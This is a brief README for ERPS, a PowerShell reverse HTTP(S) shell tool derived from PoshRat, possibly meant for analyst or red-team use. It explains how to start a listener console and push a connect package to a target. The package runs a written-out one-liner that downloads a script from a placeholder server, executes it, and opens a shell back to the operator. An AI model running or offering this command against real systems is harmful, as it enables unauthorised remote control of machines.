# Endpoint Remote/Reverse PowerShell (ERPS)

## PowerShell Reverse HTTP(s) Shell

1. Invoke _ERPS_console.ps1_ on a server you control. (Note: Requires Admin rights to listen on ports.)

2. Use the Elevate console to send the ERPS Connect script package to the target. The script package will execute the code below and connect back to the analyst machine. 
```PowerShell
   iex (New-Object Net.WebClient).DownloadString("http://server/connect")
```

Based on PoshRat By Casey Smith @subTee, updated by/forked from [ru-faraon](https://github.com/ru-faraon)
